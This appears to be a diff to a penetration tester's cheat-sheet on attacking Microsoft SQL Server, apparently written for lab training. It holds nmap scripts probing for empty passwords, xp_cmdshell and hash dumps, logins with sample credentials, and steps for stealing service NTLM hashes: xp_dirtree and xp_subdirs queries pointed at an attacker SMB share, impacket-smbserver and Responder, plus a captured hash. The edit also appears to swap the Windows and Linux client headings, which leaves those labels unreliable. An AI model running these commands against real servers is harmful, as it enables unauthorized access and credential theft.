@@ -1,5 +1,16 @@
 # Ports
 TCP/1433 UDP/1434
+
+# Queries
+```
+use DB_NAME
+go
+
+-- show tables
+SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
+go
+```
+
 # [[nmap]]
 ```shell
 sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
@@ -25,7 +36,7 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 ```shell
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 ```
-### Linux:
+### Windows:
 ```bash
 # -h for better and clean look
 sqsh -S 10.129.20.13 -U username -P Password123 -h
@@ -34,8 +45,8 @@ sqsh -S 10.129.20.13 -U username -P Password123 -h
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 sqsh -S 10.129.203.7 -U SERVERNAME\\julio -P 'MyPassword!' -h
 ```
-### Windows:
-```cmd
+### Linux:
+```bash
 sqlcmd -S 10.129.20.13 -U username -P Password123
 ```
 
@@ -93,28 +104,30 @@ To write files using `MSSQL`, we need to enable [Ole Automation Procedures](http
 ```
 
 # Capture Service Hash
-We need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
+We need first to start Responder or impacket-smbserver and execute one of the following SQL queries
+#### XP_SUBDIRS Hash Stealing with #impacket
+```bash
+# run on attack machine
+sudo impacket-smbserver share ./ -smb2support
+
+# catched hashes will be here
+```
 #### XP_DIRTREE Hash Stealing
 ```sql
-1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+1> EXEC master..xp_dirtree '\\<attack-ip>\share\'
 2> GO
 ```
 #### XP_SUBDIRS Hash Stealing
 ```sql
-1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+1> EXEC master..xp_subdirs '\\<attack-ip>\share\'
 2> GO
 ```
-#### XP_SUBDIRS Hash Stealing with Responder
+#### XP_SUBDIRS Hash Stealing with Responder instead of Impacket
 ```bash
 sudo responder -I tun0
 <SNIP>
 [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
 ```
-#### XP_SUBDIRS Hash Stealing with impacket
-```bash
-sudo impacket-smbserver share ./ -smb2support
-```
-
 # Impersonate Existing Users with MSSQL
 #### Identify Users that We Can Impersonate
 ```sql
